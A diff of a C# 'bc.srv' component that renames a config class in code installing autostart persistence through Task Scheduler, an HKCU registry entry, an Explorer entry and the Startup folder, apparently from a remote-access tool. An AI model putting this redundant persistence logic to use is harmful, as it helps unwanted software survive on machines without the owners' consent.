@@ -29,17 +29,17 @@ namespace bc.srv.Class
         private void InstallServer()
         {
             
-            if (ST_Client.Instance.UseTaskScheduler)
-                this.InstallTaskScheduler(ST_Client.Instance.sAppDataInstall);
+            if (SrvData.Instance.UseTaskScheduler)
+                this.InstallTaskScheduler(SrvData.Instance.sAppDataInstall);
             
-            if (ST_Client.Instance.bUseHKCU)
-                InstallHCKU(ST_Client.Instance.sHKCUEntry, ST_Client.Instance.sAppDataInstall);
+            if (SrvData.Instance.bUseHKCU)
+                InstallHCKU(SrvData.Instance.sHKCUEntry, SrvData.Instance.sAppDataInstall);
             
-            if (ST_Client.Instance.bUseExplorer)
-                InstallExplorer(ST_Client.Instance.sExplorerEntry, ST_Client.Instance.sAppDataInstall);
+            if (SrvData.Instance.bUseExplorer)
+                InstallExplorer(SrvData.Instance.sExplorerEntry, SrvData.Instance.sAppDataInstall);
             
-            if (ST_Client.Instance.bUseStartupFolder)
-                CopyInStartup(ST_Client.Instance.sStartupFileName);
+            if (SrvData.Instance.bUseStartupFolder)
+                CopyInStartup(SrvData.Instance.sStartupFileName);
         }
 
         private void InstallTaskScheduler(string appDataPath)
@@ -56,7 +56,7 @@ namespace bc.srv.Class
                 var xmlDestination = Path.Combine(Path.GetDirectoryName(finalDestination), fileName);
                 File.WriteAllText(xmlDestination,creationXml);
                 var dosRunner = new DosRunner();
-                dosRunner.ExecuteCommand($"schtasks.exe /Create /XML {fileName} /tn {ST_Client.Instance.TaskSchedulerName}", Path.GetDirectoryName(finalDestination));
+                dosRunner.ExecuteCommand($"schtasks.exe /Create /XML {fileName} /tn {SrvData.Instance.TaskSchedulerName}", Path.GetDirectoryName(finalDestination));
                 File.Delete(xmlDestination);
             }
             catch (Exception e)
